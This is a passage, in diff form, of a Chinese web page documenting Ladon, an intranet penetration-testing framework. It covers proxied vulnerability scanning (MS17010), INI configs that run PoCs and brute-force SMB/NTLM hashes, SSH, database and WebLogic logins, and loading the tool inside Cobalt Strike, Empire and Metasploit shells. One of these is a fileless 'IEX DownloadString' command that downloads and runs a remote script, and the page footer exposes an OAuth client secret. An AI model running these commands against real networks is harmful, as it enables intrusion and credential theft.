+程序根目录下创建对应文件即可,如批量扫描多个ip使用ip.txt,批量扫多个C段使用ip24.txt<br>
+无需指定txt程序会自动加载文件进行扫描,如扫描存活主机只需命令: Ladon OnlinePC</p>
+<h3 id="禁ping扫描">禁ping扫描</h3>
+<p>默认扫描会先通过icmp扫描主机是否存活，当使用工具转发内网<br>
+或者目标机器禁ping时,使用noping参数进行扫描,速度稍慢一点<br>
+Ladon noping<br>
+Ladon noping 192.168.1.8/24<br>
+Ladon noping 192.168.1.8/24 MS17010</p>
+<h3 id="Socks5代理扫描">Socks5代理扫描</h3>
+<p>详见：<a href="http://k8gege.org/Ladon/proxy.html">http://k8gege.org/Ladon/proxy.html</a></p>
+<h4 id="linux-macos下KaliLadon">linux/macos下KaliLadon</h4>
+<p>proxychains mono Ladon noping 192.168.1.8/24 MS17010<br>
+proxychains mono Ladon noping <a target="_blank" rel="noopener" href="http://192.168.1.1">http://192.168.1.1</a> WhatCMS</p>
+<h4 id="windows下Ladon-exe">windows下Ladon.exe</h4>
+<p>推荐proxifier 3.42及以上版本，最好是最新版4.0.1<br>
+例子：扫描目标10.1.2段是否存在MS17010漏洞（必须加noping）<br>
+Ladon noping 10.1.2.8/24 MS17010</p>
+<h3 id="配置INI调用任意程序、密码爆破">配置INI调用任意程序、密码爆破</h3>
+<p>适用场景，需调用相关命令或第三方工具进行批量操作<br>
+或者有新的POC，但来不及或无法写成DLL来调用时<br>
+很多第3方工具不支持批量或者说根本不支持批量网段<br>
+而Ladon不只限于批量IP、URL、IP段、任意内容等<br>
+是紧急情况下最适合用于验证内网是否存在漏洞工具<br>
+新的漏洞来时你能调好POC就不错了，批量更要时间</p>
+<h4 id="调用系统ping命令进行存活主机探测">调用系统ping命令进行存活主机探测</h4>
+<p>ping.ini<br>
+[Ladon]<br>
+exe=cmd.exe<br>
+arg=/c ping $ip$</p>
+<p>命令:  Ladon ping.ini<br>
+命令:  Ladon 192.168.1.8/24 ping.ini</p>
+<h4 id="调用Python-poc批量检测漏洞">调用Python poc批量检测漏洞</h4>
+<p>[Ladon]<br>
+exe=F:\Python279\python.exe<br>
+<a target="_blank" rel="noopener" href="http://arg=CVE-2019-11043-POC.py">arg=CVE-2019-11043-POC.py</a> $ip$</p>
+<p>例子: <a target="_blank" rel="noopener" href="https://github.com/k8gege/CVE-2019-11043">https://github.com/k8gege/CVE-2019-11043</a></p>
+<h4 id="自定义程序密码爆破">自定义程序密码爆破</h4>
+<p>例子：调用修改过的smbexec.exe进行HASH密码验证，原版不退出无法爆破<br>
+根目录下放4个文件，smbexec.exe、smbhash.ini、user.txt、pass.txt。</p>
+<p>smbhash.ini<br>
+[Ladon]<br>
+exe=smbexec.exe<br>
+arg=-hashes $pass$ $user$@$ip$<br>
+isok=Launching semi-interactive shell<br>
+port=445<br>
+log=true</p>
+<p>INI参数说明<br>
+isok：成功标志，必填项。如smbexec成功时返回"Launching semi-interactive shell"<br>
+port：对应端口，非必填。如SMB为445，Ladon先检测到端口开放，才进行密码爆破<br>
+log:  程序日志，非必填。如有些程序返回一堆错误结果，我们不想看，可不显示</p>
+<p>检测内网C段是否使用同一个密码,命令：Ladon 192.168.1.1/24 smbhash.ini<br>
+详见：<a href="http://k8gege.org/p/53177.html">http://k8gege.org/p/53177.html</a></p>
+<h3 id="配置端口扫描参数">配置端口扫描参数</h3>
+<h4 id="port-txt自定义端口">port.txt自定义端口</h4>
+<p>使用PortScan模块时，默认扫描常见高危漏洞端口<br>
+遇到修改了默认端口的，Ladon就无法扫描了吗？<br>
+使用port.txt<br>
+格式1:80,21,1433,3306,445<br>
+格式2:80-88,21-23,5800-5900<br>
+格式3:<br>
+21<br>
+23<br>
+80<br>
+格式4:<br>
+80-88<br>
+21-23</p>
+<h4 id="命令行自定义端口">命令行自定义端口</h4>
+<p>Ladon 192.168.1.8/24 PortScan 80-89<br>
+Ladon 192.168.1.8-192.168.1.200 PortScan 22,80,1433,21,3306,1521</p>
+<h3 id="配置密码爆破参数">配置密码爆破参数</h3>
+<p>1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br>
+2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br>
+3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认</p>
+<p>user.txt和pass.txt分别存放用户、密码<br>
+userpass.txt存放用户密码组，即每行存放用户以及密码<br>
+check.txt每行存放IP\端口\用户\密码</p>
+<h4 id="数据库口令检测">数据库口令检测</h4>
+<p>数据库与其它密码爆破不同，有时数据库做了权限，指定用户只能连指定库，连默认库肯定不行</p>
+<h5 id="mssql密码验证">mssql密码验证</h5>
+<p>(大型内网可能从其它机器收集到大量机器密码，第一步肯定是先验证)<br>
+非默认端口请将以下端口改成被修改端口即可，单个IP可直接Ladon IP:端口 MssqlScan扫描<br>
+check.txt<br>
+192.168.1.8 1433 master sa k8gege<br>
+192.168.1.8 sa k8gege<br>
+192.168.1.8 1433 sa k8gege<br>
+命令: Ladon MssqlScan</p>
+<h5 id="oracle同理">oracle同理</h5>
+<p>192.168.1.8 1521 orcl system k8gege<br>
+192.168.1.8 orcl system k8gege<br>
+192.168.1.8 system k8gege<br>
+命令: Ladon OracleScan</p>
+<h5 id="mysql无需指定数据库名">mysql无需指定数据库名</h5>
+<p>192.168.1.8 3306 root k8gege<br>
+192.168.1.8 root k8gege<br>
+命令: Ladon MysqlScan</p>
+<h5 id="系统密码">系统密码</h5>
+<h6 id="SSH密码爆破">SSH密码爆破</h6>
+<p>check.txt<br>
+192.168.1.8 22 root k8gege<br>
+192.168.1.8 root k8gege<br>
+命令: Ladon SshScan</p>
+<p>详细用法：<a href="http://k8gege.org/Ladon/sshscan.html">http://k8gege.org/Ladon/sshscan.html</a></p>
+<h6 id="SMB-WMI密码爆破">SMB/WMI密码爆破</h6>
+<p>check.txt<br>
+192.168.1.8 admin k8gege<br>
+命令: Ladon WmiScan 或 Ladon SmbScan</p>
+<h6 id="NTLM-HASH密码爆破">NTLM HASH密码爆破</h6>
+<p>check.txt<br>
+192.168.1.8 admin k8gege<br>
+命令: Ladon WmiScan 或 Ladon SmbScan</p>
+<h5 id="网站密码">网站密码</h5>
+<h6 id="weblogic密码爆破">weblogic密码爆破</h6>
+<p>check.txt(url 用户 密码)<br>
+<a target="_blank" rel="noopener" href="http://192.168.1.8:7001/console">http://192.168.1.8:7001/console</a> weblogic k8gege<br>
+命令: Ladon WeblogicScan</p>
+<h5 id="文件密码">文件密码</h5>
+<h6 id="RAR文件密码爆破">RAR文件密码爆破</h6>
+<p>因Rar压缩包只需一个密码,故只需pass.txt,注意中文密码需将txt保存为Ansi编码<br>
+命令: Ladon test.rar RarScan</p>
+<h3 id="PowerShell">PowerShell</h3>
+<p>PowerLadon完美兼容win7-win10 PowerShell，对于不支持.net程序插件化的远控，可使用<br>
+PowerShell版,也可CMD命令行下远程加载内存实现无文件扫描，模块加载后用法和EXE一致。</p>
+<h4 id="0x001-PowerShell本地加载">0x001 PowerShell本地加载</h4>
+<p>适用于支持PowerShell交互远控或Shell，如Cobalt Strike</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell </span><br><span class="line">&gt; Import-Module .\Ladon.ps1</span><br><span class="line">&gt; Ladon OnlinePC</span><br></pre></td></tr></tbody></table></figure>
+<p><img data-original="http://k8gege.org/k8img/Ladon/PowerLadon.gif"></p>
+<h4 id="0x002-Cmd本地加载">0x002 Cmd本地加载</h4>
+<p>适用于还没跟上时代的远控或Shell只支持CMD交互</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell Import-Module .\Ladon.ps1;Ladon OnlinePC</span><br></pre></td></tr></tbody></table></figure>
+<p><img data-original="http://k8gege.org/k8img/Ladon/ps/CmdPSLadon.gif"></p>
+<h4 id="0x003-Cmd远程加载">0x003 Cmd远程加载</h4>
+<p>适用于还没跟上时代的远控或Shell只支持CMD交互</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"</span></span><br></pre></td></tr></tbody></table></figure>
+<p><img data-original="http://k8gege.org/k8img/Ladon/ps/CmdPSRemoteLadon.gif"></p>
+<h4 id="0x004-远控交互式CMD">0x004 远控交互式CMD</h4>
+<p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_rat.PNG"></p>
+<h4 id="0x005-菜刀非交互CMD">0x005 菜刀非交互CMD</h4>
+<p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_cd.PNG"></p>
+<h4 id="0x006-Empire非交互CMD">0x006 Empire非交互CMD</h4>
+<p>Empire的shell有点问题，分号被截断，可以加个cmd /c<br>
+<img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_empire.PNG"></p>
+<h4 id="0x007-MSF交互式CMD">0x007 MSF交互式CMD</h4>
+<h3 id="高级用法">高级用法</h3>
+<p>Ladon最初的设计就是一款扫描框架，为了方便才内置功能<br>
+毕竟需要使用一个功能就得在目标多上传一个文件是顶麻烦的<br>
+不像MSF框架和模块多大都无所谓，因为你只是在本地使用<br>
+为了让大家都可以自定义模块，Ladon插件支持多种编程语言<br>
+最菜可通过INI配置插件，了解HTTP可通过EXP生成器生成POC<br>
+懂得编程可使用C#、Delphi、VC编写DLL，PowerShell脚本</p>
+<h4 id="0x001-Exp生成器">0x001 Exp生成器</h4>
+<p>EXP生成器教程: <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/LadonExp-Usage">https://github.com/k8gege/Ladon/wiki/LadonExp-Usage</a><br>
+实战例子: <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894">https://github.com/k8gege/Ladon/wiki/漏洞扫描-CVE-2018-2894</a></p>
+<h4 id="0x002-自定义模块教程">0x002 自定义模块教程</h4>
+<p>自定义模块教程: <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle">https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle</a></p>
+<h4 id="0x003-插件例子源码">0x003 插件例子源码</h4>
+<p><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/raw/master/MoudleDemo.rar">https://github.com/k8gege/Ladon/raw/master/MoudleDemo.rar</a></p>
+<p>完整教程：<a href="http://k8gege.org/Ladon">http://k8gege.org/Ladon</a></p>
+<h3 id="Ladon下载">Ladon下载</h3>
+<p>历史版本: <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a><br>
+7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>
+8.5版本：K8小密圈</p>
+
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/16b5ff0b.html" class="pre-post btn btn-default" title="基于Browser协议探测内网主机">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            基于Browser协议探测内网主机</span>
+    </a>
+    
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon-for-Windows"><span class="toc-text">Ladon for Windows</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon-GUI"><span class="toc-text">Ladon GUI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon-for-Cobalt-Strike"><span class="toc-text">Ladon for Cobalt Strike</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon-for-PowerShell"><span class="toc-text">Ladon for PowerShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-Ladon"><span class="toc-text">Python Ladon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon-for-Linux"><span class="toc-text">Ladon for Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E"><span class="toc-text">使用说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91"><span class="toc-text">源码编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%93%81%E4%B8%8B%E8%BD%BD"><span class="toc-text">成品下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8ELadon"><span class="toc-text">关于Ladon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E7%AE%80%E4%BB%8B"><span class="toc-text">程序简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E7%AE%80%E5%8D%95"><span class="toc-text">使用简单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83"><span class="toc-text">运行环境</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows"><span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E3%80%81Mac"><span class="toc-text">Linux、Mac</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E5%B9%B3%E5%8F%B0LadonGo"><span class="toc-text">全平台LadonGo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%87%E8%91%A9%E6%9D%A1%E4%BB%B6"><span class="toc-text">奇葩条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%97%E6%97%A8"><span class="toc-text">宗旨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E8%89%B2"><span class="toc-text">特色</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%8F%82%E6%95%B0%E5%8A%9F%E8%83%BD"><span class="toc-text">程序参数功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97-117"><span class="toc-text">内置功能模块(117)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x001-%E8%B5%84%E4%BA%A7%E6%89%AB%E6%8F%8F-11"><span class="toc-text">0x001 资产扫描(11)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x002-%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB-%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB-17"><span class="toc-text">0x002 指纹识别/服务识别(17)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x003-%E5%8F%A3%E4%BB%A4%E6%A3%80%E6%B5%8B-%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-18"><span class="toc-text">0x003 口令检测/密码爆破(18)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x004-%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-12"><span class="toc-text">0x004 漏洞检测/漏洞利用(12)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x005-%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-4"><span class="toc-text">0x005 加密解密(4)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x006-%E4%B8%8B%E8%BD%BD%E5%8A%9F%E8%83%BD-2"><span class="toc-text">0x006 下载功能(2)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x007-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2-3"><span class="toc-text">0x007 网络嗅探(3)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x008-%E5%AF%86%E7%A0%81%E8%AF%BB%E5%8F%96-3"><span class="toc-text">0x008 密码读取(3)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x009-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-12"><span class="toc-text">0x009 信息收集(12)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x010-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C-8"><span class="toc-text">0x010 远程执行(8)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x011-%E6%8F%90%E6%9D%83%E9%99%8D%E6%9D%83-9"><span class="toc-text">0x011 提权降权(9)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x012-%E5%8F%8D%E5%BC%B9Shell-4"><span class="toc-text">0x012 反弹Shell(4)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x014-%E5%85%B6%E5%AE%83%E5%8A%9F%E8%83%BD-12"><span class="toc-text">0x014 其它功能(12)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E6%8F%92%E4%BB%B6%E6%A8%A1%E5%9D%97-21"><span class="toc-text">外部插件模块(21)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E7%BA%A7%E7%94%A8%E6%B3%95"><span class="toc-text">中级用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E6%89%AB%E6%8F%8F"><span class="toc-text">批量扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81ping%E6%89%AB%E6%8F%8F"><span class="toc-text">禁ping扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Socks5%E4%BB%A3%E7%90%86%E6%89%AB%E6%8F%8F"><span class="toc-text">Socks5代理扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#linux-macos%E4%B8%8BKaliLadon"><span class="toc-text">linux/macos下KaliLadon</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#windows%E4%B8%8BLadon-exe"><span class="toc-text">windows下Ladon.exe</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEINI%E8%B0%83%E7%94%A8%E4%BB%BB%E6%84%8F%E7%A8%8B%E5%BA%8F%E3%80%81%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-text">配置INI调用任意程序、密码爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E7%B3%BB%E7%BB%9Fping%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-text">调用系统ping命令进行存活主机探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8Python-poc%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E6%BC%8F%E6%B4%9E"><span class="toc-text">调用Python poc批量检测漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%A8%8B%E5%BA%8F%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-text">自定义程序密码爆破</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%8F%82%E6%95%B0"><span class="toc-text">配置端口扫描参数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#port-txt%E8%87%AA%E5%AE%9A%E4%B9%89%E7%AB%AF%E5%8F%A3"><span class="toc-text">port.txt自定义端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%87%AA%E5%AE%9A%E4%B9%89%E7%AB%AF%E5%8F%A3"><span class="toc-text">命令行自定义端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E5%8F%82%E6%95%B0"><span class="toc-text">配置密码爆破参数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%A3%E4%BB%A4%E6%A3%80%E6%B5%8B"><span class="toc-text">数据库口令检测</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#mssql%E5%AF%86%E7%A0%81%E9%AA%8C%E8%AF%81"><span class="toc-text">mssql密码验证</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#oracle%E5%90%8C%E7%90%86"><span class="toc-text">oracle同理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#mysql%E6%97%A0%E9%9C%80%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-text">mysql无需指定数据库名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81"><span class="toc-text">系统密码</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#SSH%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-text">SSH密码爆破</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#SMB-WMI%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-text">SMB/WMI密码爆破</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#NTLM-HASH%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-text">NTLM HASH密码爆破</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81"><span class="toc-text">网站密码</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#weblogic%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-text">weblogic密码爆破</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81"><span class="toc-text">文件密码</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#RAR%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-text">RAR文件密码爆破</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell"><span class="toc-text">PowerShell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x001-PowerShell%E6%9C%AC%E5%9C%B0%E5%8A%A0%E8%BD%BD"><span class="toc-text">0x001 PowerShell本地加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x002-Cmd%E6%9C%AC%E5%9C%B0%E5%8A%A0%E8%BD%BD"><span class="toc-text">0x002 Cmd本地加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x003-Cmd%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD"><span class="toc-text">0x003 Cmd远程加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x004-%E8%BF%9C%E6%8E%A7%E4%BA%A4%E4%BA%92%E5%BC%8FCMD"><span class="toc-text">0x004 远控交互式CMD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x005-%E8%8F%9C%E5%88%80%E9%9D%9E%E4%BA%A4%E4%BA%92CMD"><span class="toc-text">0x005 菜刀非交互CMD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x006-Empire%E9%9D%9E%E4%BA%A4%E4%BA%92CMD"><span class="toc-text">0x006 Empire非交互CMD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x007-MSF%E4%BA%A4%E4%BA%92%E5%BC%8FCMD"><span class="toc-text">0x007 MSF交互式CMD</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95"><span class="toc-text">高级用法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x001-Exp%E7%94%9F%E6%88%90%E5%99%A8"><span class="toc-text">0x001 Exp生成器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x002-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A8%A1%E5%9D%97%E6%95%99%E7%A8%8B"><span class="toc-text">0x002 自定义模块教程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x003-%E6%8F%92%E4%BB%B6%E4%BE%8B%E5%AD%90%E6%BA%90%E7%A0%81"><span class="toc-text">0x003 插件例子源码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon%E4%B8%8B%E8%BD%BD"><span class="toc-text">Ladon下载</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
